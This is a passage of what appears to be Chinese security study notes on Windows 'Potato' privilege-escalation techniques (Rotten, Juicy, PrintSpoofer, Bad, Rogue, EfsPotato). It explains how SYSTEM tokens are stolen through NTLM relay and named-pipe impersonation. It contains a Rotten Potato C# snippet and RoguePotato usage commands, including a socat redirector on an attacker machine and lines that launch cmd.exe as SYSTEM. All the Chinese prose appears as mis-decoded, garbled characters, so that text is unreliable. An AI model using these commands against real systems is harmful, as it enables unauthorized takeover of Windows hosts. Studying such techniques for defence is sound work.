  <li>Windows Update æœåŠ¡é»˜è®¤æƒ…å†µä¸‹ä¼šè¯·æ±‚ http://wpad/wpad.dat æ¥è·å–ç½‘ç»œä»£ç†é…ç½®ã€‚ä½†ä¸æ˜¯æ‰€æœ‰çš„ä¸»æœºéƒ½å­˜åœ¨ä¿å­˜ç€è¯¥åŸŸåè§£æçš„ç»“æœï¼Œå½“æœ¬åœ° HOST åŠ DNS æŸ¥è¯¢éƒ½æ— æ³•è·å–è¯¥åŸŸåçš„è§£æç»“æœæ—¶ï¼Œå°±ä¼šè§¦å‘ NBNS æŸ¥è¯¢ã€‚</li>
  <li>æ”»å‡»è€…åœ¨æœ¬åœ°å‘èµ· NBNSï¼ˆNetBIOS åç§°æœåŠ¡ï¼‰æ¬ºéª—ã€‚ä½¿å¾— Windows åœ¨æœ¬åœ°å¹¿æ’­æŸ¥è¯¢ç›®æ ‡ HOST æ—¶ï¼Œæ”»å‡»è€…ä¼ªé€ å“åº”ï¼Œå£°ç§° wpad æœåŠ¡å™¨ IP åœ°å€ä¸º 127.0.0.1ï¼Œå¹¶ä¸”è¿”å›ç½‘ç»œä»£ç†é…ç½®ä¸º 127.0.0.1:80</li>
  <li>Windows Update æœåŠ¡è·å–åˆ°ç½‘ç»œä»£ç†åï¼Œæ‰€æœ‰çš„ http æµé‡å°±éƒ½ä¼šç»è¿‡æ”»å‡»è€…æ­å»ºçš„ 127.0.0.1:80ã€‚</li>
  <li>æ­¤æ—¶ Windows Update æœåŠ¡è¿›è¡Œ NTLM è®¤è¯ä¸­çš„ Hash å°±ä¼šè¢«æ”»å‡»è€…æ•è·ï¼Œä»è€Œå‘èµ· NTLM Relay æ”»å‡»ã€‚</li>
</ol>

<p>å±€é™ï¼š
è¿™ç§æ”»å‡»æ‰‹æ³•éœ€è¦ç­‰å¾… windows update æœåŠ¡å‘èµ·æ›´æ–°è¯·æ±‚ã€‚</p>

<h3 id="rotten-potato">Rotten Potato</h3>
<p>æ”»å‡»åŸç†ï¼š</p>
<ol>
  <li>COM ï¼ˆç»„ä»¶å¯¹è±¡æ¨¡å‹ï¼‰API å¯ä»¥åœ¨æŒ‡å®šçš„ç½‘ç»œä½ç½®åŠ è½½ä¸€ä¸ªæœåŠ¡å¯¹è±¡ã€‚ä»¥ä¸‹é¢çš„ä»£ç ä¸ºä¾‹ï¼ŒCOM API å‡½æ•° CoGetInstanceFromIStorage ä¼šæ ¹æ®æŒ‡å®šçš„ IP åœ°å€å’Œç«¯å£å· 127.0.0.1:6666 å»è·å–æŒ‡å®šçš„å¯¹è±¡å®ä¾‹ï¼Œè¯¥å¯¹è±¡å®ä¾‹çš„ Guid ä¸º 4991d34b-80a1-4291-83b6-3328366b9097ï¼Œå¯¹åº” BITS å®ä¾‹ã€‚å¦‚æœæ­¤æ—¶æ”»å‡»è€…åœ¨ 127.0.0.1:6666 ç«¯å£æ­£å¸¸å›å¤ï¼Œå°±å¯ä»¥å¼ºåˆ¶è®© COM ä»¥ SYSTEM æƒé™å¯¹ 6666 ç«¯å£å‘èµ· net-NTLM è®¤è¯ã€‚ï¼ˆä¸ºä»€ä¹ˆé€‰æ‹© BITS å®ä¾‹ï¼Œ<strong>æ˜¯å› ä¸º BITS å®ç°äº† IMarshal æ¥å£</strong>å¹¶å…è®¸ä»£ç†å£°æ˜å¼ºåˆ¶ NTLM èº«ä»½éªŒè¯ï¼‰
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">public</span> <span class="k">static</span> <span class="kt">void</span> <span class="nf">BootstrapComMarshal</span><span class="p">()</span>
 <span class="p">{</span>
 <span class="n">IStorage</span> <span class="n">stg</span> <span class="o">=</span> <span class="n">ComUtils</span><span class="p">.</span><span class="n">CreateStorage</span><span class="p">();</span>
    
 <span class="c1">// Use a known local system service COM server, in this cast BITSv1</span>
 <span class="n">Guid</span> <span class="n">clsid</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Guid</span><span class="p">(</span><span class="s">"4991d34b-80a1-4291-83b6-3328366b9097"</span><span class="p">);</span>
    
 <span class="n">TestClass</span> <span class="n">c</span> <span class="o">=</span> <span class="n">new</span> <span class="n">TestClass</span><span class="p">(</span><span class="n">stg</span><span class="p">,</span> <span class="n">String</span><span class="p">.</span><span class="n">Format</span><span class="p">(</span><span class="s">"{0}[{1}]"</span><span class="p">,</span> <span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="mi">6666</span><span class="p">));</span> <span class="c1">// ip and port</span>
    
 <span class="n">MULTI_QI</span><span class="p">[]</span> <span class="n">qis</span> <span class="o">=</span> <span class="n">new</span> <span class="n">MULTI_QI</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    
 <span class="n">qis</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">pIID</span> <span class="o">=</span> <span class="n">ComUtils</span><span class="p">.</span><span class="n">IID_IUnknownPtr</span><span class="p">;</span>
 <span class="n">qis</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">pItf</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
 <span class="n">qis</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">hr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    
 <span class="n">CoGetInstanceFromIStorage</span><span class="p">(</span><span class="n">null</span><span class="p">,</span> <span class="n">ref</span> <span class="n">clsid</span><span class="p">,</span> <span class="n">null</span><span class="p">,</span> <span class="n">CLSCTX</span><span class="p">.</span><span class="n">CLSCTX_LOCAL_SERVER</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span>       <span class="n">qis</span><span class="p">);</span>
 <span class="p">}</span>
</code></pre></div>    </div>
  </li>
  <li>å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿå®Œæˆè¿™ä¸€æ¬¡ NTLM è®¤è¯ï¼Œå°±å¯ä»¥è·å–åˆ° tokenï¼Œ<strong>ä½œè€…ä¹Ÿä½¿ç”¨äº†ä¸€ä¸ªå·§å¦™çš„æ–¹æ³•ï¼Œè°ƒç”¨ AcceptSecurityContext å‡½æ•°æ¥å¤„ç† NLTM è®¤è¯</strong>
    <ol>
      <li>AcceptSecurityContext æ˜¯ Windows API ä¸­ç”¨äºå®‰å…¨ä¸Šä¸‹æ–‡å»ºç«‹çš„å‡½æ•°ä¹‹ä¸€ï¼Œç‰¹åˆ«æ˜¯åœ¨ä½¿ç”¨å®‰å…¨å¥—æ¥å­—ï¼ˆSecure Socket Layerï¼ŒSSLï¼‰æˆ–è€…å®‰å…¨çš„è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼ˆRemote Procedure Callï¼ŒRPCï¼‰ç­‰åœºæ™¯ä¸‹ã€‚å®ƒé€šå¸¸ç”¨äºåœ¨<strong>æœåŠ¡ç«¯æ¥å—æ¥è‡ªå®¢æˆ·ç«¯çš„èº«ä»½éªŒè¯</strong>ï¼Œå¹¶å»ºç«‹ä¸€ä¸ªå®‰å…¨ä¸Šä¸‹æ–‡ï¼ˆsecurity contextï¼‰ä»¥ä¾¿è¿›è¡Œåç»­çš„å®‰å…¨é€šä¿¡ã€‚<strong>è¿™æ ·ä¸€æ¥ï¼ŒCOM å……å½“å®¢æˆ·ç«¯ï¼ŒAcceptSecurityContext å……å½“æœåŠ¡ç«¯ï¼Œå°±èƒ½å¤Ÿå®Œæˆ NTLM è®¤è¯ã€‚</strong></li>
    </ol>
  </li>
  <li>å°½ç®¡æ”»å‡»è€…ä½œä¸ºä¸­é—´äººå°† AcceptSecurityContext ä¸ COM ä¹‹é—´å»ºç«‹èµ·äº† NTLM è®¤è¯ï¼Œä½†ä¸¤è€…ä¹‹é—´çš„äº¤äº’è¿‡ç¨‹å¹¶ä¸æ˜¯ç®€å•çš„è½¬å‘ï¼Œä¸»è¦æœ‰ä¸¤ä¸ªé—®é¢˜ï¼š
    <ol>
      <li>è¦æ­£ç¡®å“åº” COM æœåŠ¡ï¼Œéœ€è¦æ­£ç¡®çš„ RPC åè®®çš„æ•°æ®åŒ…ã€‚ä½œè€…å°† <strong>COM çš„è¯·æ±‚å‘é€åˆ° 135 ç«¯å£çš„ rpcss æœåŠ¡æ¥è·å–ä¸€ä¸ªå“åº”æ¨¡æ¿</strong>ã€‚</li>
      <li>ä¸¤ä¸ªæ¬¡ NTLM Challenge æŠ¥æ–‡ä¸­çš„ NTLM Server Challenge ä»¥åŠ Reserved å­—æ®µä¸åŒï¼Œéœ€è¦è¿›è¡Œä¿®æ”¹ã€‚</li>
    </ol>
  </li>
  <li>ä¸Šè¿°çš„ä¸¤ä¸ªé—®é¢˜è§£å†³ä¹‹åï¼Œå°±å¯ä»¥å·§å¦™åœ°è·å–åˆ° SYSTEM tokenã€‚æœ‰äº† SYSTEM æƒé™çš„ token ä¹‹åï¼Œå¦‚æœå½“å‰ç”¨æˆ·æ‹¥æœ‰ SelmpersonatePrivilege æˆ–è€… SeAssignPrimaryToken æƒé™ï¼Œå°±å¯ä»¥é€šè¿‡è¯¥ Token åˆ›å»ºæ–°è¿›ç¨‹è¾¾æˆææƒã€‚</li>
</ol>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231120024104.png" alt="20231120024104" /></p>

<p>æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
  <li>åˆ©ç”¨ CoGetInstanceFromIStorage API å¼ºåˆ¶ NT AUTHORITY/SYSTEM è¿è¡Œçš„ RPC æœåŠ¡å‘æˆ‘ä»¬çš„æœ¬åœ°ä»£ç†(localhost:6666)å‘èµ· NTLM èº«ä»½éªŒè¯ã€‚
    <ol>
      <li>CoGetInstanceFromIStorage API</li>
    </ol>
  </li>
  <li>RPC å‘ä»£ç†å‘é€ NTLM Negotiate åŒ…ã€‚</li>
  <li>ä»£ç†å°† NTLM Negotiate åŒ…è½¬å‘ç»™ç«¯å£ 135 çš„ RPC æœåŠ¡ã€‚äºæ­¤åŒæ—¶ï¼Œè°ƒç”¨ AcceptSecurityContext æ¥å¼ºåˆ¶è¿›è¡Œæœ¬åœ°èº«ä»½éªŒè¯ã€‚</li>
  <li>RPC 135 å’Œ AcceptSecurityContext å‘ä»£ç†å‘é€ NTLM Challengeã€‚ä¸¤ä¸ªæ•°æ®åŒ…çš„å†…å®¹è¢«æ··åˆä»¥åŒ¹é…æœ¬åœ°åå•†å¹¶è½¬å‘åˆ° RPCï¼Œå…¶ä¸­ RPC 135 å“åº”çš„æŠ¥æ–‡å……å½“ RPC è°ƒç”¨çš„æ¨¡æ¿ã€‚</li>
  <li>RPC ä½¿ç”¨ NLTM Auth åŒ…è¿›è¡Œå“åº”ï¼Œè¯¥åŒ…è¢«ä»£ç†æœåŠ¡å™¨å‘é€åˆ° AcceptSecurityContext (8.) å¹¶æ‰§è¡Œæ¨¡æ‹Ÿ (9.)ã€‚</li>
</ol>

<p>å½±å“èŒƒå›´ï¼š</p>
<ul>
  <li>&lt; win10 1809 å’Œ windows server 2019</li>
</ul>

<hr />
<p>ç›¸å…³æ¦‚å¿µï¼š</p>
<ol>
  <li>åˆ†å¸ƒå¼ç»„ä»¶å¯¹è±¡æ¨¡å‹(DCOM)
    <ol>
      <li>COM æ˜¯ Windows çš„ä¸€ä¸ªç»„ä»¶ï¼Œå®ƒä¿ƒè¿›äº†è½¯ä»¶ä¹‹é—´çš„äº’æ“ä½œæ€§ï¼ŒDCOM é€šè¿‡è¿œç¨‹è¿‡ç¨‹è°ƒç”¨(RPC)åœ¨ç½‘ç»œä¸Šæ‰©å±•äº†è¿™ä¸€ç‚¹ã€‚</li>
    </ol>
  </li>
  <li>åå°æ™ºèƒ½ä¼ è¾“æœåŠ¡(BITS) å¯ä¾›ç¨‹åºå‘˜å’Œç³»ç»Ÿç®¡ç†å‘˜ç”¨äºä» HTTP Web æœåŠ¡å™¨å’Œ SMB æ–‡ä»¶å…±äº«ä¸‹è½½æ–‡ä»¶æˆ–å°†æ–‡ä»¶ä¸Šä¼ åˆ°å…¶ä¸­ã€‚
    <ol>
      <li>Windows Updateï¼š BITS æœåŠ¡ç”¨äºä¸‹è½½å’Œå®‰è£… Windows æ›´æ–°ã€‚</li>
      <li>Windows Defender ç—…æ¯’å®šä¹‰æ›´æ–°ï¼š BITS ç”¨äºåå°æ›´æ–° Windows Defender ç—…æ¯’å®šä¹‰ã€‚</li>
      <li>åº”ç”¨ç¨‹åºå’Œç³»ç»Ÿæ›´æ–°ï¼š ç¬¬ä¸‰æ–¹åº”ç”¨ç¨‹åºå’Œç³»ç»Ÿç»„ä»¶å¯ä»¥åˆ©ç”¨ BITS è¿›è¡Œåå°æ›´æ–°ã€‚</li>
    </ol>
  </li>
  <li>
    <h2 id="clsidæ˜¯æ ‡è¯†-com-ç±»å¯¹è±¡çš„å…¨å±€å”¯ä¸€æ ‡è¯†ç¬¦å®ƒæ˜¯ä¸€ä¸ªç±»ä¼¼uuidçš„æ ‡è¯†ç¬¦">CLSIDæ˜¯æ ‡è¯† COM ç±»å¯¹è±¡çš„å…¨å±€å”¯ä¸€æ ‡è¯†ç¬¦ã€‚å®ƒæ˜¯ä¸€ä¸ªç±»ä¼¼UUIDçš„æ ‡è¯†ç¬¦ã€‚</h2>
  </li>
</ol>

<h3 id="juicy-potato">Juicy Potato</h3>
<p>Rotten Potato çš„ PoC ä½¿ç”¨äº† COM æ¥æ¿€æ´» BITS æœåŠ¡ã€‚Windows åœ¨ä¿®è¡¥ Rotten Potato æ—¶ï¼Œç¦ç”¨äº† BITS æœåŠ¡ï¼Œå¹¶ä¸”å ç”¨äº† 6666 ç«¯å£ï¼Œä½†è¯¥ä¿®è¡¥å¹¶ä¸èƒ½å®Œå…¨æœç»è¿™ç±»é—®é¢˜ï¼Œä½œè€…æ‰¾åˆ°äº†å…¶ä»–å¯ä»¥é€‰æ‹©çš„ COM å¯¹è±¡ï¼Œä¹Ÿå¯ä»¥å‘èµ· NTLM è¯·æ±‚ã€‚</p>

<p>å…¶å…·ä½“åˆ©ç”¨è¿‡ç¨‹ä¸ Rotten Potato ç±»ä¼¼ï¼š</p>
<ol>
  <li>Juicy Potato é€šè¿‡ä¼ é€’ BITS çš„ CLSID å’Œ IStorage å¯¹è±¡å®ä¾‹ç»™ CoGetInstanceFromIStorage å‡½æ•°ï¼Œä½¿å¾— rpcss æ¿€æ´» BITS æœåŠ¡ã€‚</li>
  <li>éšå rpcss çš„ DCOM OXID resolver ä¼šè§£æåºåˆ—åŒ–æ•°æ®ä¸­çš„ OBJREF æ‹¿åˆ°DUALSTRINGARRAY å­—æ®µï¼Œè¯¥å­—æ®µæŒ‡å®šäº† host[port] æ ¼å¼çš„ locationï¼Œç»‘å®šå¯¹è±¡æ—¶ä¼šå‘å…¶ä¸­çš„ host[port] å‘é€ DEC/RPC è¯·æ±‚ï¼Œè¿™æ—¶ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶äº†è¿™ä¸ªç«¯å£ï¼Œå°±å¯ä»¥è¦æ±‚è¿›è¡Œ NTLM èº«ä»½éªŒè¯ï¼Œé‚£ä¹ˆé«˜æƒé™æœåŠ¡å°±ä¼šå‘é€ net-NTLM è¿›è¡Œè®¤è¯ã€‚</li>
  <li>å…¶åçš„è¿‡ç¨‹ä¸ Rotten Potato ä¸€è‡´</li>
</ol>

<p>å½±å“èŒƒå›´ï¼š</p>
<ul>
  <li>&lt; Windows 10 1809</li>
  <li>&lt; Windows Server 2019</li>
</ul>

<h3 id="pipe-potatoprintspoofer">Pipe Potatoï¼ˆPrintSpooferï¼‰</h3>
<p><strong>å‘½åç®¡é“ææƒåŸç†</strong>ï¼š
windows ä¸­æœ‰ä¸€ä¸ª API ImpersonateNamedPipeClient()ï¼Œå…è®¸æœåŠ¡ç«¯è¿›ç¨‹å¯¹è¿æ¥åˆ°å®ƒçš„å®¢æˆ·ç«¯è¿›ç¨‹è¿›è¡Œæ¨¡æ‹Ÿã€‚é€šè¿‡è°ƒç”¨ ImpersonateNamedPipeClient()ï¼Œå‘½åç®¡é“æœåŠ¡ç«¯å¯ä»¥æ¨¡æ‹Ÿå‘½åç®¡é“å®¢æˆ·ç«¯çš„å®‰å…¨ä¸Šä¸‹æ–‡ï¼Œä»è€Œç›´æ¥å°†å‘½åç®¡é“æœåŠ¡ç«¯å½“å‰çº¿ç¨‹çš„ Token ä»¤ç‰Œæ›´æ”¹ä¸ºå‘½åç®¡é“å®¢æˆ·ç«¯çš„ Tokenä»¤ç‰Œã€‚</p>

<p>å› æ­¤å‘½åç®¡é“ææƒçš„åŸç†å¤§å¤šç±»ä¼¼ï¼Œä¸€èˆ¬æ˜¯è¯±ä½¿ system æƒé™çš„æœåŠ¡è®¿é—®æˆ‘ä»¬åˆ›å»ºçš„å‘½åç®¡é“ã€‚</p>

<p><strong>PrintSpoofer åŸç†</strong>ï¼š</p>

<p>Windows çš„ MS-RPRN åè®®ç”¨äºæ‰“å°å®¢æˆ·æœºå’Œæ‰“å°æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡ï¼Œé»˜è®¤æƒ…å†µä¸‹å¯ç”¨ã€‚åŒæ—¶ï¼ŒPrint Spooler æœåŠ¡çš„ RPC æ¥å£æš´éœ²åœ¨å‘½åç®¡é“ï¼š\.\pipe\spoolss ä¸­ï¼Œè¯¥æœåŠ¡é»˜è®¤å¼€å¯ã€‚</p>

<p>MS-RPRN åè®®å®šä¹‰çš„ RpcRemoteFindFirstPrinterChangeNotificationEx() å‡½æ•°åˆ›å»ºä¸€ä¸ªè¿œç¨‹æ›´æ”¹é€šçŸ¥å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ç›‘è§†å¯¹æ‰“å°æœºå¯¹è±¡çš„æ›´æ”¹ï¼Œå¹¶å°†æ›´æ”¹é€šçŸ¥å‘é€åˆ°æ‰“å°å®¢æˆ·ç«¯ï¼Œå¹¶ä¸”å°±æ˜¯é€šè¿‡å‘½åç®¡é“å®ç°è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ã€‚</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="n">RpcRemoteFindFirstPrinterChangeNotificationEx</span><span class="p">(</span> 
    <span class="cm">/* [in] */</span> <span class="n">PRINTER_HANDLE</span> <span class="n">hPrinter</span><span class="p">,</span>
    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">fdwFlags</span><span class="p">,</span>
    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">fdwOptions</span><span class="p">,</span>
    <span class="cm">/* [unique][string][in] */</span> <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">pszLocalMachine</span><span class="p">,</span>
    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">dwPrinterLocal</span><span class="p">,</span>
    <span class="cm">/* [unique][in] */</span> <span class="n">RPC_V2_NOTIFY_OPTIONS</span> <span class="o">*</span><span class="n">pOptions</span><span class="p">)</span>

</code></pre></div></div>
<p>å…¶ä¸­ pszLocalMachine æ˜¯æŒ‡å‘è¡¨ç¤ºå®¢æˆ·ç«¯è®¡ç®—æœºåç§°çš„å­—ç¬¦ä¸²çš„æŒ‡é’ˆï¼Œéœ€è¦ä¼ é€’ä¸€ä¸ª UNC è·¯å¾„ï¼Œä¼ é€’ \127.0.0.1 æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè®¿é—® \127.0.0.1\pipe\spoolssï¼Œä½†è¿™ä¸ªç®¡é“å·²ç»è¢«ç³»ç»Ÿæ³¨å†Œäº†ï¼Œå¹¶ç”± NT AUTHORITY\SYSTEM æ§åˆ¶ã€‚å¦‚æœæˆ‘ä»¬ä¼ å…¥æ˜¯ \127.0.0.1\pipe\demoï¼Œ spoolsv.exe è¿›ç¨‹ä¹Ÿä¼šå¯¹Server nameåšäº†æ ¡éªŒï¼Œæœ€åè¿˜æ˜¯ä¼šæ›¿æ¢æˆ \192.168.110.137\pipe\spools ç®¡é“ã€‚</p>

<p>ä½œè€…åœ¨è¿™é‡Œåˆ©ç”¨äº† windows UNC è·¯å¾„è§„èŒƒåŒ–çš„æŠ€å·§ç»•è¿‡äº†è¿™ä¸ªé™åˆ¶</p>

<p>è€ƒè™‘åˆ° UNC è·¯å¾„çš„æ€§è´¨ï¼Œå¦‚æœä¸»æœºååŒ…å« /ï¼Œå®ƒå°†é€šè¿‡è·¯å¾„æ£€æŸ¥ï¼Œä½†çœŸæ­£è¿æ¥çš„æ—¶å€™ä¼šè½¬åŒ–ä¸º \ ã€‚é‚£ä¹ˆï¼Œå¦‚æœä¼ é€’ä¸€ä¸ª \127.0.0.1/pipe/fooï¼Œæ£€æŸ¥æ—¶ä¼šè®¤ä¸º 127.0.0.1/pipe/foo æ˜¯ä¸€ä¸ªä¸»æœºåï¼Œéšååœ¨è¿æ¥ named pipe æ—¶ä¼šå¯¹å‚æ•°åšæ ‡å‡†åŒ–ï¼Œäºæ˜¯å°±ä¼šè¿æ¥ \127.0.0.1\pipe\foo\pipe\spoolssï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥æŠŠä¸»æœºåæ”¹ä¸º \127.0.0.1/pipe/foo å¹¶æ³¨å†Œè¿™ä¸ª named pipe ä»è€Œçªƒå– client çš„ tokenã€‚</p>

<p>åˆ©ç”¨å·¥å…·ï¼š</p>
<ul>
  <li><a href="https://github.com/itm4n/PrintSpoofer">itm4n/PrintSpoofer: Abusing impersonation privileges through the â€œPrinter Bugâ€</a></li>
</ul>

<p>å‚è€ƒï¼š</p>
<ul>
  <li><a href="https://paper.seebug.org/2090/">Windows å‘½åç®¡é“å®¢æˆ·ç«¯æ¨¡æ‹Ÿå’Œ PrintSpoofer åŸç†æ¢ç©¶</a></li>
</ul>

<h3 id="bad-potato">Bad Potato</h3>
<p>BadPotatoæ˜¯C#ç‰ˆæœ¬çš„PrintSpoolerï¼Œç»“æ„ä»£ç ä¹Ÿæ›´åŠ ç®€åŒ–ï¼Œå¹¶ä¸”æ¶æ„ç®¡é“æœåŠ¡ç«¯ç”¨çš„æ˜¯å¯¹æ–¹æœºå™¨çš„åå­—ï¼Œè€ŒPrintSpoolerç”¨çš„æ˜¯éšæœºç”Ÿæˆçš„UUIDï¼ŒpipePotatoåˆ™æ˜¯å›ºå®šçš„â€xxxâ€ï¼ˆå¯¼è‡´å¯ç”¨æ€§ä¹Ÿæ›´ä½ï¼‰</p>

<p>åˆ©ç”¨å·¥å…·ï¼š</p>
<ul>
  <li><a href="https://github.com/BeichenDream/BadPotato">BeichenDream/BadPotato: Windows æƒé™æå‡ BadPotato</a></li>
</ul>

<h3 id="rogue-potato">Rogue Potato</h3>
<p>ä¸ºäº†ä¿®è¡¥ Juicy Potatoï¼Œé«˜ç‰ˆæœ¬çš„ Windows DCOM è§£æå™¨ä¸å…è®¸ OBJREF ä¸­çš„ DUALSTRINGARRAY å­—æ®µæŒ‡å®šç«¯å£å·ã€‚</p>

<p><strong>åˆ©ç”¨æ¡ä»¶ï¼š</strong></p>
<ol>
  <li>æˆ‘ä»¬éœ€è¦æœ‰ä¸€å°æœºå™¨åœ¨æˆ‘ä»¬çš„æ§åˆ¶ä¹‹ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å…¶ä¸­æ‰§è¡Œé‡å®šå‘ï¼Œå¹¶ä¸”å—å®³è€…å¿…é¡»å¯ä»¥åœ¨ç«¯å£ 135ä¸Šè®¿é—®è¯¥æœºå™¨</li>
  <li>æˆ‘ä»¬éœ€è¦ä¸Šä¼ ä¸¤ä¸ª exe æ–‡ä»¶ï¼Œå½“å—å®³è€…çš„é˜²ç«å¢™ä¸æ¥å—ä¼ å…¥è¿æ¥æ—¶ï¼Œä¹Ÿå¯ä»¥åœ¨æˆ‘ä»¬æ§åˆ¶çš„ Windows æœºå™¨ä¸Šä»¥ç‹¬ç«‹æ¨¡å¼å¯åŠ¨ä¼ªé€ çš„ OXID è§£æå™¨</li>
</ol>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231120041332.png" alt="20231120041332" /></p>

<p>åˆ©ç”¨æ€è·¯ï¼š</p>
<ol>
  <li>
    <p>Rogue Potato çš„åˆ©ç”¨æ€è·¯æ˜¯åœ¨è¿œç¨‹æœåŠ¡å™¨çš„ 135 ç«¯å£ä¸Šåšä¸€ä¸ªè½¬å‘ï¼Œç”¨äºå°† OXID è§£æè¯·æ±‚é‡å®šå‘åˆ°ä¸€ä¸ªå‡çš„OXID RPC æœåŠ¡å™¨ã€‚</p>
  </li>
  <li>
    <p>ä¼ªé€ çš„OXID RPC æœåŠ¡å™¨å®ç°äº†ResolveOxid2æœåŠ¡å™¨è¿‡ç¨‹ï¼Œè¯¥è¿‡ç¨‹å°†æŒ‡å‘å—æ§å‘½åç®¡é“[ncacn_np:localhost/pipe/roguepotato[\pipe\epmapper]</p>
  </li>
  <li>
    <p>DCOM æœåŠ¡å™¨å°†è¿æ¥åˆ° RPC æœåŠ¡å™¨ä»¥æ‰§è¡Œ IRemUnkown2 æ¥å£è°ƒç”¨ã€‚é€šè¿‡è¿æ¥åˆ°å‘½åç®¡é“ï¼Œå°†æ‰§è¡Œâ€èº«ä»½éªŒè¯å›è°ƒâ€ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ RpcImpersonateClient()è°ƒç”¨æ¨¡æ‹Ÿè°ƒç”¨è€…ã€‚</p>
  </li>
  <li>
    <p>ç„¶å,ä»¤ç‰Œçªƒå–è€…
  1.è·å–rpcssæœåŠ¡çš„PID
  2.æ‰“å¼€è¿›ç¨‹ï¼Œåˆ—å‡ºæ‰€æœ‰å¥æŸ„ï¼Œå¹¶ä¸ºæ¯ä¸ªå¥æŸ„å°è¯•å¤åˆ¶å®ƒå¹¶è·å–å¥æŸ„ç±»å‹
  3.å¦‚æœå¥æŸ„ç±»å‹ä¸ºâ€Tokenâ€ä¸”ä»¤ç‰Œæ‰€æœ‰è€…ä¸º SYSTEMï¼Œåˆ™å°è¯•ä½¿ç”¨CreatProcessAsUser()æˆ–CreateProcessWithToken()æ¨¡æ‹Ÿå¹¶å¯åŠ¨è¿›ç¨‹</p>
  </li>
</ol>

<p><strong>å½±å“èŒƒå›´ï¼š</strong></p>
<ul>
  <li>&gt;= Windows 10 1809 &amp; Windows Server 2019</li>
</ul>

<p>åˆ©ç”¨å·¥å…·ï¼š</p>
<ul>
  <li>https://github.com/antonioCoco/RoguePotato</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Network redirector / port forwarder to run on your remote machine, must use port 135 as src port</span>
socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999

<span class="c"># RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. </span>
<span class="c"># Use this if you have fw restrictions.</span>
RoguePotato.exe <span class="nt">-r</span> 10.0.0.3 <span class="nt">-e</span> <span class="s2">"C:</span><span class="se">\w</span><span class="s2">indows</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">md.exe"</span>

<span class="c"># RoguePotato all in one with RogueOxidResolver running locally on port 9999</span>
RoguePotato.exe <span class="nt">-r</span> 10.0.0.3 <span class="nt">-e</span> <span class="s2">"C:</span><span class="se">\w</span><span class="s2">indows</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">md.exe"</span> <span class="nt">-l</span> 9999

<span class="c">#RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename</span>
RoguePotato.exe <span class="nt">-r</span> 10.0.0.3 <span class="nt">-e</span> <span class="s2">"C:</span><span class="se">\w</span><span class="s2">indows</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">md.exe"</span> <span class="nt">-l</span> 9999 <span class="nt">-c</span> <span class="s2">"{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}"</span> <span class="nt">-p</span> splintercode
</code></pre></div></div>

<h3 id="efspotatopetitpotam">EfsPotatoï¼ˆPetitPotamï¼‰</h3>
<p>åˆ©ç”¨EFSRPCï¼ˆåŠ å¯†æ–‡ä»¶ç³»ç»Ÿè¿œç¨‹åè®®ï¼‰ï¼Œè¿›è¡ŒNTLMä¸­ç»§æ”»å‡»å¯å®ç°ADåŸŸå†…æƒé™æå‡æˆ–æœ¬åœ°æƒé™æå‡ã€‚</p>

<p>å½±å“èŒƒå›´ï¼š
    Windows Server, version 20H2 (Server Core Installation)
    Windows Server, version 2004 (Server Core installation)
    Windows Server 2019  (Server Core installation)
    Windows Server 2019
    Windows Server 2016  (Server Core installation)
    Windows Server 2016
    Windows Server 2012 R2 (Server Core installation)
    Windows Server 2012 R2
    Windows Server 2012 (Server Core installation)
    Windows Server 2012
    Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for x64-based Systems Service Pack 2
    Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for 32-bit Systems Service Pack 2
    Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
    Windows Server 2008 R2 for x64-based Systems Service Pack 1</p>

<p>åˆ©ç”¨å·¥å…·ï¼š</p>
<ul>
  <li><a href="https://github.com/zcgonvh/EfsPotato">zcgonvh/EfsPotato: Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).</a></li>
  <li><a href="https://github.com/bugch3ck/SharpEfsPotato">bugch3ck/SharpEfsPotato: Local privilege escalation from SeImpersonatePrivilege using EfsRpc.</a></li>
</ul>

